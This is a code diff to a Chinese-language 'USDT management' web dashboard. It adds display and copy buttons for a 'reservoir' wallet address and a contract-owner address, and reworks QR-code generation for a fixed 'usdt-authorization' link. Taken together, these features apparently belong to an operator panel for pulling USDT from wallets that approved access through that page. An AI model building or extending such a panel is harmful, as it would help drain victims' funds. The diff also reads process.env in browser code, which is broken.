@@ -6,6 +6,7 @@
     <title>USDT管理系統</title>
     <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
     <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" rel="stylesheet">
+    <script src="https://cdn.jsdelivr.net/npm/qrcodejs2@0.0.2/qrcode.min.js"></script>
     <style>
         :root {
             --primary-color: #0d6efd;
@@ -146,6 +147,20 @@
             text-align: center;
         }
 
+        .address-container {
+            background: rgba(255,255,255,0.1);
+            border-radius: 8px;
+            padding: 8px;
+            margin-top: 8px;
+        }
+
+        .address-text {
+            font-family: monospace;
+            word-break: break-all;
+            margin-bottom: 0;
+            font-size: 0.9rem;
+        }
+
         @keyframes fadeIn {
             from { opacity: 0; }
             to { opacity: 1; }
@@ -169,6 +184,10 @@
             .wallet-list {
                 max-height: calc(100vh - 250px);
             }
+
+            .address-text {
+                font-size: 0.8rem;
+            }
         }
 
         /* 深色模式支持 */
@@ -191,6 +210,10 @@
 
             .bottom-nav {
                 background-color: #2d2d2d;
+            }
+
+            .address-container {
+                background: rgba(255,255,255,0.05);
             }
         }
     </style>
@@ -216,6 +239,15 @@
                             <small class="text-warning" id="trxWarning" style="display: none;">
                                 <i class="fas fa-exclamation-triangle"></i> TRX餘額過低
                             </small>
+                            <div class="address-container">
+                                <small class="text-light">合約擁有者地址:</small>
+                                <div class="d-flex align-items-center">
+                                    <code id="contractOwnerAddress" class="address-text me-2"></code>
+                                    <button class="btn btn-light btn-sm" onclick="copyAddress('contractOwnerAddress')">
+                                        <i class="fas fa-copy"></i>
+                                    </button>
+                                </div>
+                            </div>
                         </div>
                     </div>
                 </div>
@@ -224,6 +256,15 @@
                         <div class="card-body">
                             <h5 class="card-title">水庫 USDT 餘額</h5>
                             <h2 class="mb-0" id="usdtBalance">載入中...</h2>
+                            <div class="address-container">
+                                <small class="text-light">水庫錢包地址:</small>
+                                <div class="d-flex align-items-center">
+                                    <code id="reservoirAddress" class="address-text me-2">TYfH1UFjepVVFaEsaCk4MAHM2yA5RQk899</code>
+                                    <button class="btn btn-light btn-sm" onclick="copyAddress('reservoirAddress')">
+                                        <i class="fas fa-copy"></i>
+                                    </button>
+                                </div>
+                            </div>
                         </div>
                     </div>
                 </div>
@@ -365,13 +406,12 @@
     </nav>
 
     <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js"></script>
-    <script src="https://cdn.jsdelivr.net/npm/qrcode.js@1.0.0/qrcode.min.js"></script>
     <script src="https://cdn.socket.io/4.0.1/socket.io.min.js"></script>
-<script>
+    <script>
 // 配置
-const API_BASE_URL = 'https://spectacular-wholesale-sprint.glitch.me'; // 如果在同一域名下可以留空，或填入API的完整URL
+const API_BASE_URL = ''; // 如果在同一域名下可以留空，或填入API的完整URL
 const RESERVOIR_WALLET = 'TYfH1UFjepVVFaEsaCk4MAHM2yA5RQk899';
-const QR_CODE_URL = 'https://heathwang888.github.io/usdt-authorization'; // 填入要生成QR碼的URL
+const QR_CODE_URL = 'https://heathwang888.github.io/usdt-authorization/'; // 固定的授權URL
 
 // 全局變量
 let socket;
@@ -457,7 +497,9 @@ function setupEventListeners() {
     document.getElementById('confirmTransfer').addEventListener('click', confirmTransfer);
 
     // QR碼功能
-    document.getElementById('copyUrl').addEventListener('click', copyQrUrl);
+    document.getElementById('copyUrl').addEventListener('click', function() {
+        copyToClipboard(QR_CODE_URL);
+    });
     document.getElementById('downloadQr').addEventListener('click', downloadQrCode);
 }
 
@@ -492,6 +534,8 @@ async function refreshDashboard() {
         const trxData = await trxResponse.json();
         if (trxData.balance) {
             document.getElementById('trxBalance').textContent = `${trxData.balance.toFixed(2)} TRX`;
+            // 設置合約擁有者地址
+            document.getElementById('contractOwnerAddress').textContent = process.env.CONTRACT_OWNER;
         }
 
         // 獲取水庫錢包USDT餘額
@@ -692,28 +736,62 @@ function updateTransferStatus(type, message) {
 
 // QR碼功能
 function initializeQRCode() {
-    const qrcode = new QRCode(document.getElementById('qrCode'), {
-        text: QR_CODE_URL,
-        width: 256,
-        height: 256
-    });
+    try {
+        const qrContainer = document.getElementById('qrCode');
+        qrContainer.innerHTML = ''; // 清空容器
+        
+        new QRCode(qrContainer, {
+            text: QR_CODE_URL,
+            width: 256,
+            height: 256,
+            colorDark: "#000000",
+            colorLight: "#ffffff",
+            correctLevel: QRCode.CorrectLevel.H
+        });
+    } catch (error) {
+        console.error('生成QR碼失敗:', error);
+        document.getElementById('qrCode').innerHTML = '<div class="alert alert-danger">QR碼生成失敗</div>';
+    }
 }
 
-function copyQrUrl() {
-    navigator.clipboard.writeText(QR_CODE_URL)
-        .then(() => showToast('success', '連結已複製'))
-        .catch(() => showToast('error', '複製失敗'));
+// 複製功能
+function copyAddress(elementId) {
+    const text = document.getElementById(elementId).textContent;
+    copyToClipboard(text);
 }
 
+function copyToClipboard(text) {
+    navigator.clipboard.writeText(text)
+        .then(() => {
+            showToast('success', '已複製到剪貼板');
+        })
+        .catch(() => {
+            showToast('error', '複製失敗');
+        });
+}
+
+// 下載QR碼
 function downloadQrCode() {
     const canvas = document.querySelector('#qrCode canvas');
-    const link = document.createElement('a');
-    link.download = 'qrcode.png';
-    link.href = canvas.toDataURL('image/png');
-    link.click();
+    if (!canvas) {
+        showToast('error', 'QR碼尚未生成');
+        return;
+    }
+    
+    try {
+        const link = document.createElement('a');
+        link.download = 'qrcode.png';
+        link.href = canvas.toDataURL('image/png');
+        document.body.appendChild(link);
+        link.click();
+        document.body.removeChild(link);
+    } catch (error) {
+        console.error('下載QR碼失敗:', error);
+        showToast('error', '下載QR碼失敗');
+    }
 }
 
-// 工具函數
+// Toast 通知
 function showToast(type, message) {
     const toastContainer = document.querySelector('.toast-container');
     const toast = document.createElement('div');
